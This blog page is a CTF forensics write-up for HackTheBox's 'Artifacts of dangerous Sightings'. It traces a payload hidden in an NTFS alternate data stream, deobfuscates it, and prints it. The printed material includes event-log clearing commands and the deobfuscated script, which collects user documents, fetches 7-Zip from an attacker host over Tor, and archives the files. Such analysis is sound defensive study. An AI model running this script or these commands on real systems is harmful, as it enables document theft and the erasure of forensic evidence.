<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Artifacts of dangerous Sightings writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Description Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces …" /><meta property="og:description" content="Description Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces …" /><link rel="canonical" href="https://bitisg.github.io/posts/Artifacts/" /><meta property="og:url" content="https://bitisg.github.io/posts/Artifacts/" /><meta property="og:site_name" content="BitisGabonica" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-23T14:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Artifacts of dangerous Sightings writeup" /><meta name="twitter:site" content="@BitisGabonica1" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-23T14:00:00+01:00","datePublished":"2023-03-23T14:00:00+01:00","description":"Description Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces …","headline":"Artifacts of dangerous Sightings writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://bitisg.github.io/posts/Artifacts/"},"url":"https://bitisg.github.io/posts/Artifacts/"}</script><title>Artifacts of dangerous Sightings writeup | BitisGabonica</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BitisGabonica"><meta name="application-name" content="BitisGabonica"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/sui.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BitisGabonica</a></div><div class="site-subtitle font-italic">CTF writeups and other stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BitisG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/BitisGabonica1" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xBitisGabonica','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Artifacts of dangerous Sightings writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/challenges/artifacts/a.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Artifacts of dangerous Sightings writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1679576400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-03-23 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="865 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><h2 id="description"><span class="mr-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces …</p><h2 id="writeup"><span class="mr-2">Writeup</span><a href="#writeup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We are given a <code class="language-plaintext highlighter-rouge">vhdx</code> file, which contains a snapshot of the Windows machine belonging to Pandora. Looking through the snapshot, we find a powershell history file, containing the following:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">type finpayload &gt;</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>asks<span class="se">\A</span>ctiveSyncProvider.dll:hidden.ps1
<span class="go">exit
Get-WinEvent
Get-EventLog -List
wevtutil.exe cl "Windows PowerShell" 
wevtutil.exe cl Microsoft-Windows-PowerShell/Operational
Remove-EventLog -LogName "Windows PowerShell"
Remove-EventLog -LogName Microsoft-Windows-PowerShell/Operational
Remove-EventLog 
</span></pre></table></code></div></div><p>We can tell based on this that a payload is echoed into the file given by the path <code class="language-plaintext highlighter-rouge">C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1</code>, and then eventlogs are deleted.</p><p>Wait, what? On the system there is no file named <code class="language-plaintext highlighter-rouge">ActiveSyncProvider.dll:hidden.ps1</code>, nor <code class="language-plaintext highlighter-rouge">hidden.ps1</code>, so what’s going on here? Turns out, on Windows there is a thing called ADS, or Alternative Data Stream. Basically, it can be used to add meta data to files, however in this case it is used to store a (presumably) malicious payload inside the metadata of <code class="language-plaintext highlighter-rouge">ActiveSyncProvider.dll</code>. If we look at recently modified files on the snapshot this file also shows up as the most recently modified, so this makes sense.</p><p>We can extract the payload by using the powershell command:</p><div class="language-ps highlighter-rouge"><div class="code-header"> <span data-label-text="Ps"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">Get-Content</span> <span class="nf">.\ActiveSyncProvider.dll</span> <span class="nf">-Stream</span> <span class="nf">hidden.ps1</span>
</pre></table></code></div></div><p>The contents of the file looks like this:</p><div class="language-ps highlighter-rouge"><div class="code-header"> <span data-label-text="Ps"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">powerShell.exe</span> <span class="nf">-WindowStyle</span> <span class="nf">hiddeN</span> <span class="nf">-ExecuTionPolicy</span> <span class="nf">ByPasS</span> <span class="nf">-enc</span> <span class="nf">JAB7AFsAfgBAAH0AIAA9ACAAJAAoACkAOw....</span>
</pre></table></code></div></div><p>As we can tell, the payload runs a base64 encoded string as a powershell script. If we decode this string we end up with a payload that looks like this:</p><div class="language-ps highlighter-rouge"><div class="code-header"> <span data-label-text="Ps"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nf">$</span><span class="p">{[</span><span class="nf">~@</span><span class="p">}</span> <span class="nf">=</span> <span class="nf">$</span><span class="s">()</span><span class="nf">;</span>
<span class="nf">$</span><span class="p">{</span><span class="nf">!!@!!</span><span class="p">]}</span> <span class="nf">=</span> <span class="nf">++$</span><span class="p">{[</span><span class="nf">~@</span><span class="p">}</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{[[</span><span class="nf">!</span><span class="p">}</span> <span class="nf">=</span> <span class="nf">--$</span><span class="p">{[</span><span class="nf">~@</span><span class="p">}</span> <span class="nf">+</span> <span class="nf">$</span><span class="p">{</span><span class="nf">!!@!!</span><span class="p">]}</span> <span class="nf">+</span> <span class="nf">$</span><span class="p">{</span><span class="nf">!!@!!</span><span class="p">]}</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{</span><span class="nf">~~~</span><span class="p">]}</span> <span class="nf">=</span> <span class="nf">$</span><span class="p">{[[</span><span class="nf">!</span><span class="p">}</span> <span class="nf">+</span> <span class="nf">$</span><span class="p">{</span><span class="nf">!!@!!</span><span class="p">]}</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{[</span><span class="nf">!!</span><span class="p">[</span><span class="nf">!</span><span class="p">}</span> <span class="nf">=</span> <span class="nf">$</span><span class="p">{[[</span><span class="nf">!</span><span class="p">}</span> <span class="nf">+</span> <span class="nf">$</span><span class="p">{[[</span><span class="nf">!</span><span class="p">}</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{</span><span class="s">(~(!} = ${~~~]} + ${[[!}; ${!~!))</span><span class="p">}</span> <span class="nf">=</span> <span class="nf">$</span><span class="p">{[</span><span class="nf">!!</span><span class="p">[</span><span class="nf">!</span><span class="p">}</span> <span class="nf">+</span> <span class="nf">$</span><span class="p">{[[</span><span class="nf">!</span><span class="p">}</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{</span><span class="s">((!} = ${!!@!!]} + ${[!![!} + ${[[!}; 
${=!!@!!}  = ${~~~]} - ${!!@!!]} + ${!~!))</span><span class="p">}</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{</span><span class="nf">!=</span><span class="p">}</span> <span class="nf">=</span> <span class="nf"> $</span><span class="p">{</span><span class="s">((!} - ${~~~]} + ${!~!))</span><span class="p">}</span> <span class="nf">-</span> <span class="nf">$</span><span class="p">{</span><span class="nf">!!@!!</span><span class="p">]}</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{</span><span class="nf">=@!~!</span><span class="p">}</span> <span class="nf">=</span> <span class="nf">"".</span><span class="s">("$(@{})"[14]+"$(@{})"[16]+"$(@{})"[21]+"$(@{})"[27]+"$?"[1]+"$(@{})"[3])</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{</span><span class="nf">=@!~!</span><span class="p">}</span> <span class="nf">=</span> <span class="nf">"$</span><span class="s">(@{})</span><span class="nf">"</span><span class="p">[</span><span class="mf">14</span><span class="p">]</span><span class="nf">+"$?"</span><span class="p">[</span><span class="mf">3</span><span class="p">]</span><span class="nf">+"$</span><span class="p">{</span><span class="nf">=@!~!</span><span class="p">}</span><span class="nf">"</span><span class="p">[</span><span class="mf">27</span><span class="p">]</span><span class="nf">;</span> 
<span class="nf">$</span><span class="p">{</span><span class="nf">@!=</span><span class="p">}</span> <span class="nf">=</span> <span class="nf">"</span><span class="p">[</span><span class="nf">"+"$</span><span class="s">(@{})</span><span class="nf">"</span><span class="p">[</span><span class="mf">7</span><span class="p">]</span><span class="nf">+"$</span><span class="s">(@{})</span><span class="nf">"</span><span class="p">[</span><span class="mf">22</span><span class="p">]</span><span class="nf">+"$</span><span class="s">(@{})</span><span class="nf">"</span><span class="p">[</span><span class="mf">20</span><span class="p">]</span><span class="nf">+"$?"</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="nf">+"</span><span class="p">]</span><span class="nf">";</span>

<span class="nf">"$</span><span class="p">{</span><span class="nf">@!=</span><span class="p">}</span><span class="nf">$</span><span class="p">{</span><span class="nf">~~~</span><span class="p">]}</span><span class="nf">$</span><span class="p">{</span><span class="s">(~(!} + ${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ......" |&amp; ${=@!~!}
</span></pre></table></code></div></div><p>Obviosuly this looks like a super obfuscated and malicious piece of powershell malware. We can deobfuscate it by opening our powershell terminal, defining the same variables that the script itself defines, and then pasting in the string, without piping it into anything to avoid executing it. Obviously, it this was a real piece of malware we would have to be a little more careful, but since we are on a linux machine anyways it probably won’t be too bad. We then get a slightly more deobfuscated version:</p><div class="language-ps highlighter-rouge"><div class="code-header"> <span data-label-text="Ps"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">35</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">35</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">35</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">46</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">43</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="p">[</span><span class="nf">Char</span><span class="p">]</span><span class="mf">32</span> <span class="nf">+</span> <span class="nf">...</span>
</pre></table></code></div></div><p>We can further deobfuscate this quite trivially, by loading this as a string in a python script, replacing all the <code class="language-plaintext highlighter-rouge">[Char]</code> blocks with empty strings, and then building the deobfuscated powershell script using the provided char codes. The result of this operation can be seen below:</p><div class="language-ps highlighter-rouge"><div class="code-header"> <span data-label-text="Ps"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="nf">function</span> <span class="nf">makePass</span>
<span class="p">{</span>
    <span class="nf">$alph=@</span><span class="s">()</span><span class="nf">;</span>
    <span class="nf">65..90|foreach-object</span><span class="p">{</span><span class="nf">$alph+=</span><span class="p">[</span><span class="nf">char</span><span class="p">]</span><span class="nf">$_</span><span class="p">}</span><span class="nf">;</span>
    <span class="nf">$num=@</span><span class="s">()</span><span class="nf">;</span>
    <span class="nf">48..57|foreach-object</span><span class="p">{</span><span class="nf">$num+=</span><span class="p">[</span><span class="nf">char</span><span class="p">]</span><span class="nf">$_</span><span class="p">}</span><span class="nf">;</span>

    <span class="nf">$res</span> <span class="nf">=</span> <span class="nf">$num</span> <span class="nf">+</span> <span class="nf">$alph</span> <span class="nf">|</span> <span class="nf">Sort-Object</span> <span class="p">{</span><span class="nf">Get-Random</span><span class="p">}</span><span class="nf">;</span>
    <span class="nf">$res</span> <span class="nf">=</span> <span class="nf">$res</span> <span class="nf">-join</span> <span class="nf">'';</span>
    <span class="nf">return</span> <span class="nf">$res;</span>
<span class="p">}</span>

<span class="nf">function</span> <span class="nf">makeFileList</span>
<span class="p">{</span>
    <span class="nf">$files</span> <span class="nf">=</span> <span class="nf">cmd</span> <span class="nv">/c</span> <span class="nf">where</span> <span class="nv">/r</span> <span class="nf">$env:USERPROFILE</span> <span class="nf">*.pdf</span> <span class="nf">*.doc</span> <span class="nf">*.docx</span> <span class="nf">*.xls</span> <span class="nf">*.xlsx</span> <span class="nf">*.pptx</span> <span class="nf">*.ppt</span> <span class="nf">*.txt</span> <span class="nf">*.csv</span> <span class="nf">*.htm</span> <span class="nf">*.html</span> <span class="nf">*.php;</span>
    <span class="nf">$List</span> <span class="nf">=</span> <span class="nf">$files</span> <span class="nf">-split</span> <span class="nf">'\r';</span>
    <span class="nf">return</span> <span class="nf">$List;</span>
<span class="p">}</span>

<span class="nf">function</span> <span class="nf">compress</span><span class="s">($Pass)</span>
<span class="p">{</span>
    <span class="nf">$tmp</span> <span class="nf">=</span> <span class="nf">$env:TEMP;</span>
    <span class="nf">$s</span> <span class="nf">=</span> <span class="nf">'https:</span><span class="err">/</span><span class="nv">/relic-reclamation-anonymous.alien:1337/prog/';</span>
    <span class="nf">$link_7zdll</span> <span class="nf">=</span> <span class="nf">$s</span> <span class="nf">+</span> <span class="nf">'7z.dll';</span>
    <span class="nf">$link_7zexe</span> <span class="nf">=</span> <span class="nf">$s</span> <span class="nf">+</span> <span class="nf">'7z.exe';</span>

    <span class="nf">$7zdll</span> <span class="nf">=</span> <span class="nf">'"'+$tmp+'\7z.dll"';</span>
    <span class="nf">$7zexe</span> <span class="nf">=</span> <span class="nf">'"'+$tmp+'\7z.exe"';</span>
    <span class="nf">cmd</span> <span class="nv">/c</span> <span class="nf">curl</span> <span class="nf">-s</span> <span class="nf">-x</span> <span class="nf">socks5h:</span><span class="err">/</span><span class="nv">/localhost:9050</span> <span class="nf">$link_7zdll</span> <span class="nf">-o</span> <span class="nf">$7zdll;</span>
    <span class="nf">cmd</span> <span class="nv">/c</span> <span class="nf">curl</span> <span class="nf">-s</span> <span class="nf">-x</span> <span class="nf">socks5h:</span><span class="err">/</span><span class="nv">/localhost:9050</span> <span class="nf">$link_7zexe</span> <span class="nf">-o</span> <span class="nf">$7zexe;</span>

    <span class="nf">$argExtensions</span> <span class="nf">=</span> <span class="nf">'*.pdf</span> <span class="nf">*.doc</span> <span class="nf">*.docx</span> <span class="nf">*.xls</span> <span class="nf">*.xlsx</span> <span class="nf">*.pptx</span> <span class="nf">*.ppt</span> <span class="nf">*.txt</span> <span class="nf">*.csv</span> <span class="nf">*.htm</span> <span class="nf">*.html</span> <span class="nf">*.php';</span>

    <span class="nf">$argOut</span> <span class="nf">=</span> <span class="nf">'Desktop\AllYourRelikResearchHahaha_</span><span class="p">{</span><span class="mf">0</span><span class="p">}</span><span class="nf">.zip'</span> <span class="nf">-f</span> <span class="s">(Get-Random -Minimum 100000 -Maximum 200000)</span><span class="nf">.ToString</span><span class="s">()</span><span class="nf">;</span>
    <span class="nf">$argPass</span> <span class="nf">=</span> <span class="nf">'-p'</span> <span class="nf">+</span> <span class="nf">$Pass;</span>

    <span class="nf">Start-Process</span> <span class="nf">-WindowStyle</span> <span class="nf">Hidden</span> <span class="nf">-Wait</span> <span class="nf">-FilePath</span> <span class="nf">$tmp'\7z.exe'</span> <span class="nf">-ArgumentList</span> <span class="nf">'a',</span> <span class="nf">$argOut,</span> <span class="nf">'-r',</span> <span class="nf">$argExtensions,</span> <span class="nf">$argPass</span> <span class="nf">-ErrorAction</span> <span class="nf">Stop;</span>
<span class="p">}</span>

<span class="nf">$Pass</span> <span class="nf">=</span> <span class="nf">makePass;</span>
<span class="nf">$fileList</span> <span class="nf">=</span> <span class="nf">@</span><span class="s">(makeFileList)</span><span class="nf">;</span>
<span class="nf">$fileResult</span> <span class="nf">=</span> <span class="nf">makeFileListTable</span> <span class="nf">$fileList;</span>
<span class="nf">compress</span> <span class="nf">$Pass;</span>
<span class="nf">$TopSecretCodeToDisableScript</span> <span class="nf">=</span> <span class="nf">"HTB</span><span class="p">{</span><span class="nf">Y0U_C4nt_St0p_Th3_Alli4nc3</span><span class="p">}</span><span class="nf">"</span>
</pre></table></code></div></div><p>We then receive our flag and have solved the challenge.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/forensics/" class="post-tag no-text-decoration" >forensics</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Artifacts of dangerous Sightings writeup - BitisGabonica&amp;url=https://bitisg.github.io/posts/Artifacts/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Artifacts of dangerous Sightings writeup - BitisGabonica&amp;u=https://bitisg.github.io/posts/Artifacts/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://bitisg.github.io/posts/Artifacts/&amp;text=Artifacts of dangerous Sightings writeup - BitisGabonica" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DroidComp/">DroidComp writeup</a><li><a href="/posts/Faculty/">Faculty writeup</a><li><a href="/posts/Trick/">Trick writeup</a><li><a href="/posts/Seal/">Seal writeup</a><li><a href="/posts/Devzat/">Devzat writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a 